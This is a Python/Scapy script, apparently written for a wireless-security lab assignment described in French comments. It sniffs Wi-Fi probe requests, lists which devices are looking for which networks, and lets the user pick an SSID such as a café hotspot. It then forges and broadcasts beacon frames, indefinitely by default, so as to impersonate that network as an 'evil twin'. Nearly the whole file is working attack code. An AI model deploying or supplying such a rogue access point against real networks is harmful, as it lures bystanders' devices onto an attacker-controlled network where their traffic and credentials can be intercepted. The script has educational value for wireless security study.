import argparse
import pandas as pandas
from scapy.all import *
from scapy.layers.dot11 import Dot11ProbeReq, Dot11, Dot11Elt, RadioTap, Dot11Beacon

probes = pandas.DataFrame(columns=["SSID", "source MAC", "Channel"])
# set the index SSID (MAC address of the AP)
probes.set_index("SSID", inplace=True)


def callback(packet):
    if packet.haslayer(Dot11ProbeReq):
        # get the SSID in the Probe Request
        ssid = packet[Dot11Elt].info.decode()
        if ssid == "":
            ssid = "<empty>"
        # source address of the device searching for network
        source_mac = packet[Dot11].addr2
        # extract network stats
        stats = packet[Dot11ProbeReq].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        probes.loc[ssid] = (source_mac, channel)


def print_all(stop):
    while True:
        os.system("clear")
        print(probes)
        print(f"Sniffing will end after {sniff_time} seconds...")
        time.sleep(0.5)

        if stop():
            break


# Développer un script en Python/Scapy capable de detecter une STA cherchant un SSID particulier -
# proposer un evil twin si le SSID est trouvé (i.e. McDonalds, Starbucks, etc.).
# 1. Détecter une STA cherchant un SSID particulier: Probe Requests
# 2. SSID trouvé?
# 3. Proposer un evil twin
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="A python script for detecting probe requests and creating evil twin "
                                                 "of chosen SSID")
    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan0'",
                        default="wlan0")
    parser.add_argument("-s", dest="sniff_time", help="Sniffing time (in seconds), default is 10s",
                        default=10)
    parser.add_argument("-c", "--count", help="Number of beacons to send, specify 0 to keep sending "
                                              "infinitely, default is 0", default=0)
    parser.add_argument("--interval",
                        help="The sending frequency (in seconds) between two frames sent, default is 0.1s",
                        default=0.1)

    args = parser.parse_args()

    interface = args.iface
    sniff_time = int(args.sniff_time)
    count = int(args.count)
    interval = float(args.interval)

    stop_threads = False
    # start the thread that prints all the networks
    printer = Thread(target=print_all, args=(lambda: stop_threads,))
    printer.daemon = True
    printer.start()

    # start sniffing
    sniff(prn=callback, iface=interface, timeout=sniff_time)

    # stop threads used for sniffing
    stop_threads = True
    printer.join()

    if probes.empty:
        print("No probe requests detected")
    else:
        chosen_ssid = input("Please choose a network to impersonate by entering its SSID : ")
        source_mac, channel = probes.loc[chosen_ssid]

        # choose a channel 6 channels away from the original network
        channel = (channel + 6) % 14

        # random BSSID as the sender address and AP address
        random_mac = RandMAC()

        # forging a beacon with type 0 and subtype 8 (Management frame and Beacon), broadcast address as
        # destination address,
        packet = RadioTap() \
                 / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=random_mac, addr3=random_mac) \
                 / Dot11Beacon() \
                 / Dot11Elt(ID="SSID", info=chosen_ssid, len=len(chosen_ssid)) \
                 / Dot11Elt(ID="DSset", info=chr(channel))

        if count == 0:
            # if count is 0, it means we loop forever (until interrupt)
            loop = 1
            count = None
            print(f"\n[+] Sending beacons of network {chosen_ssid} on channel {channel} every {interval}s forever...")
        else:
            loop = 0
            print(f"\n[+] Sending {count} beacons of network {chosen_ssid} on channel {channel} every {interval}s...")

        # sending beacons
        sendp(packet, inter=interval, count=count, loop=loop, iface=interface, verbose=1)
